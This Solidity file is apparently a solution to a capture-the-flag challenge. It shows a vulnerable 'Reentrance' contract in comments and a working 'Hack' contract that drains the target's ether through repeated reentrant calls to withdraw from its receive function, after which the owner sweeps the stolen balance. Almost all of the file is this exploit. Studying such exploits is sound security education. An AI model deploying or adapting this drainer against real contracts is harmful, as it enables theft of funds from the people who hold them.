// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "openzeppelin-contracts-06/math/SafeMath.sol";

// contract Reentrance {
//     using SafeMath for uint256;
//     mapping(address => uint) public balances;

//     function donate(address _to) public payable {
//         balances[_to] = balances[_to].add(msg.value);
//     }

//     function balanceOf(address _who) public view returns (uint balance) {
//         return balances[_who];
//     }

//     function withdraw(uint _amount) public {
//         if (balances[msg.sender] >= _amount) {
//             (bool result, ) = msg.sender.call{value: _amount}("");
//             if (result) {
//                 _amount;
//             }
//             balances[msg.sender] -= _amount;
//         }
//     }

//     receive() external payable {}
// }

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint balance);

    function withdraw(uint _amount) external;
}

contract Hack {
    address public target;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(owner == msg.sender);
        _;
    }

    function hack(address _target) external payable onlyOwner {
        target = _target;
        IReentrance(target).donate{value: msg.value}(address(this));
        IReentrance(target).withdraw(msg.value);
    }

    function withdraw() external payable onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        if (msg.sender == target && address(target).balance > 0) {
            IReentrance(target).withdraw(msg.value);
        }
    }
}
